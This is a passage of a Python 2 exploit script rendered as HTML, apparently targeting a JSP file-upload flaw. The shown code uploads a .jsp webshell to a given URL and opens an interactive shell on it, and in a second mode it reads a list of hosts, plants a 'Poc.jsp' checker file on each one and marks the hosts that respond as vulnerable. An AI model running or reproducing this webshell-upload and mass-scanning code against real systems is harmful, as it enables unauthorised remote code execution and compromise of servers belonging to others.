bcolors.OKGREEN+banner+bcolors.ENDC </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn=str(opt.P)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url=str(opt.U)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;Uploading Webshell .....&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn=pwn+&quot;.jsp&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RCE(str(url)+&quot;/&quot;,pwn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell(str(url),pwn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif opt.L!=None and opt.P==None and opt.U==None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print bcolors.OKGREEN+banner+bcolors.ENDC </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w=str(opt.L)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f=open(w,&quot;r&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;Scaning hosts in {}&quot;.format(w)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checker=&quot;Poc.jsp&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for i in f.readlines():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i=i.strip(&quot;\n&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;createPayload(str(i)+&quot;/&quot;,checker)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;con=getContent(str(i)+&quot;/&quot;,checker)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; in con:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print str(i)+&quot;\033[91m&quot;+&quot; [ Vulnerable ] &quot;&quot;\033[0m&quot;</span></p></body>
</html>
